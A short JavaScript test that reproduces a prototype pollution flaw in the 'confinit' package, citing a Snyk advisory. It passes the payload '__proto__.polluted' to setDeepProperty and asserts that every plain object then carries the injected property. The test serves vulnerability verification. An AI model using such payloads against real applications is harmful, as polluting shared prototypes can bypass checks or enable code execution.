//https://snyk.io/vuln/SNYK-JS-CONFINIT-564433
test("prototype pollution in confinit", () => {
  const root = require("confinit");
  const payload = "__proto__.polluted";

  expect({}.polluted).toBe(undefined);

  root.setDeepProperty({}, payload, "yes");

  expect({}.polluted).toBe("yes");
});
